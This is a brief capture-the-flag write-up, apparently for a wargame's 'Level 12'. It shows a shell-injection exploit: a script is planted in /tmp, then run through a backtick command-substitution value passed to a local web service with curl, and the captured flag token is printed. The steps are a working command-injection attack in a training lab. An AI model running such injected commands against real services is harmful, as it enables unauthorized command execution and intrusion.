# Level 12

## step 1 : analyze level12

## step 2 : shell injection
```
$ echo "getflag > /tmp/flag12" > /tmp/HELLO
$ chmod 777 /tmp/HELLO
$ curl localhost:4646/?x='`/*/HELLO`'
$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
